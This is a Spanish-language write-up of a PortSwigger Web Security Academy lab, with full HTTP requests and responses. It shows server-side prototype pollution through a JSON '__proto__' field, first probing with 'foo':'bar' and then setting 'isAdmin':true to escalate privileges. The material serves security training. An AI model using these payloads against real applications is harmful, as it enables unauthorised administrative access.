---
description: >-
  https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
---

# Lab 6: Privilege escalation via server-side prototype pollution

Primero revisamos el trafico que genera el aplicativo web y se detecta el siguiente request:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Cookie: session=6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq
Content-Length: 168
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq"}
```
{% endcode %}

La peticion anterior responde asi:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d1-h8RJcJes4ggLc1QgdnqPhZHRM9I"
Date: Tue, 25 Jun 2024 19:49:37 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 209

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```
{% endcode %}

Luego de lo anterior, enviamos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Cookie: session=6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq
Content-Length: 203
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq","__proto__": {
    "foo":"bar"
}}
```
{% endcode %}

La peticion anterior es lo mismo pero se le esta adicionando esto:

```
"__proto__": {
    "foo":"bar"
}
```

Y la respuesta fue la siguiente:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d1-h8RJcJes4ggLc1QgdnqPhZHRM9I"
Date: Tue, 25 Jun 2024 19:48:27 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 209

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"foo":"bar"}
```
{% endcode %}

La respuesta incluyo el objeto de JSON enviado.

Por lo anterior, se procede con el envio del siguiente request:

```json
POST /my-account/change-address HTTP/2
Host: 0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Cookie: session=6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq
Content-Length: 208
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2600020363cc7c82e897a300e1005e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"6dQ1ygb3I2MOSq2gg6pJV2Ojnb2pWtiq",
"__proto__": {
    "isAdmin":true
}}
```

Y tenemos como respuesta:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d0-C/bYHMdz0P5+PlERv2aVqQjVdR8"
Date: Tue, 25 Jun 2024 19:49:43 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 208

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}
```
{% endcode %}

Teniendo en cuenta lo anterior, hemos realizado una escalacion de privilegios y esto lo podemos validar accediendo a:

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
